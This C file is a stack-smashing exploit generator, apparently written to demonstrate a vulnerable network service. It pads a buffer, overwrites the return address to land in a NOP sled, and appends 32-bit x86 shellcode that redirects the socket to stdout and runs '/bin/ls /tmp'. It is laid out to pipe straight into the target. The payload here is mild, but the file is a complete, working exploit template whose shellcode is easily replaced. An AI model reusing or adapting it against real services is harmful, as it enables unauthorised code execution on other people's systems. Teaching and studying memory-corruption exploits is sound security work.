/**
 Demonstrate service vulnerability via stack smashing
*/
#include <stdio.h>
#include <stdlib.h>

/* Vulnerable machine's word size */
typedef unsigned int word;

int offset=0;
unsigned char xorby=0;
unsigned int bytesleft=0;
void emit(unsigned char x) {
	x=x^xorby; // fix outgoing xor at this stage
	//printf("\\x%02x",x); // for $'shellcode'
	putc(x,stdout); // for direct pipe
	bytesleft--;
	offset++;
}
void emit_word(word w) {
	emit(w); // little endian target
	emit(w>>8);
	emit(w>>16);
	emit(w>>24);
}

/*
void emit_long(long w) {
	emit_word(w); // little endian target
	emit_word(w>>32);
}
*/


// Emit simple command syscall as binary machine code
//    See disassembly with 
//      echo -n $'\x...' > a
//      ndisasm -b 32 a
void emit_shell(void) {
	// nop "sled" to allow some slop in jump target address
	for (int sled=0;sled<32;sled++) emit(0x90);

	const char *shell=
	// Brittle attempt at getting output on the network:
	// only works for first client received at server.
	// dup2(syscall 33) args (network fd(4),stdout(1))
	"\x31\xc0" 
	"\xb0\x3f" // eax = 63
	"\x31\xdb"
	"\xb3\x04" // ebx = 4
	"\x31\xc9"
	"\xb1\x01" // ecx = 1
	"\xcd\x80" // syscall
	
	// Issue execve
	// http://shell-storm.org/shellcode/files/shellcode-758.php
	"\x31\xc0"
	"\x50"
	"\x68" "//ls" // exe
	"\x68" "/bin" // dir
	"\x89\xe3"
	"\x50"
	"\x68" "/tmp"  // ls argument
	"\x89\xe1"
	"\x50"
	"\x31\xd2"
	"\x51"
	"\x53"
	"\x89\xe1"
	"\xb0\x0b" // syscall number for execve
	"\xcd\x80";
	
	while (*shell!=0) emit(*shell++);
}

int main(int argc,char *argv[]) {
	unsigned long address=0;
	if (argc>1) sscanf(argv[1],"%lx",&address);

	// Address of target function
	word target=(word)address;
	fprintf(stderr,"Address: 0x%08x\n",target);
	
	// Pad buffer with 'a':
	while (offset<(128+8+4)) emit(0x61); 
	
	// Overwrite return address on stack:
	word returnHere=target-0xb8+offset+16;  // jump to middle of NOP sled
	fprintf(stderr,"Jump target: 0x%08x\n",returnHere);
	emit_word(returnHere);
	
	// Payload code at end of buffer (protected from later stack manipulation)
	emit_shell();
	
	// Finish up with newline
	emit('\n');
	
	return 0;
}


